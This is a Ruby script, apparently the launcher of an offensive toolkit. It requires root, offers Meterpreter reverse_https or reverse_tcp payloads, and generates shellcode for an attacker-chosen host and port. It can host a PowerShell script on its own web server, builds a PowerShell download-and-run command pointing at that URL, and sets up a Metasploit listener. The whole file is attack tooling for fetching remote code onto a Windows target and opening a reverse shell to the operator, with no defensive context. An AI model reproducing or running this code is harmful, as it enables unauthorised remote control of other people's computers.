#!/usr/bin/env ruby
require_relative 'lib/core'
require_relative 'lib/server'
require_relative 'lib/menu'
include MainCommands
include MsfCommands
include Menu
def payload_select
    puts "Please pick the payload you would like to use\n"
    print "
    \n1) windows/meterpreter/reverse_https \
    \n2) windows/meterpreter/reverse_tcp \
    \n99) Exit\n"
    Readline.readline('> ', true)
end
begin
  if Process.uid != 0
    print_error("Must run as root!\n")
    exit
  end
  server = Server.new
  msfhost_alert
  msf_host = server.get_host
  msf_port = server.get_port
  payload = payload_select
  payload = available_payloads(payload)
  hosting = Readline.readline("#{get_input('Would you like to host the powershell script?[yes/no]')} ", true)
  if hosting == 'yes'
    webhost_alert
    webserver_host = server.get_host
    webserver_port = server.get_port
    shell_code = generate_shellcode(msf_host,msf_port,payload)
    ssl = Readline.readline("#{get_input('Would you like to use ssl?[yes/no]')} ", true)
    ssl = true if ssl == 'yes'
    Thread.new { server.ruby_web_server(webserver_port,ssl,webserver_host,shell_code) }
    ssl ? powershell_command("https://#{webserver_host}:#{webserver_port}") : powershell_command("http://#{webserver_host}:#{webserver_port}")
    metasploit_setup(msf_host,msf_port,payload)
  else
    url = Readline.readline("#{get_input('Enter the url that holds the powershell script: ')} ", true)
    powershell_command(url)
    metasploit_setup(msf_host,msf_port,payload)
  end
end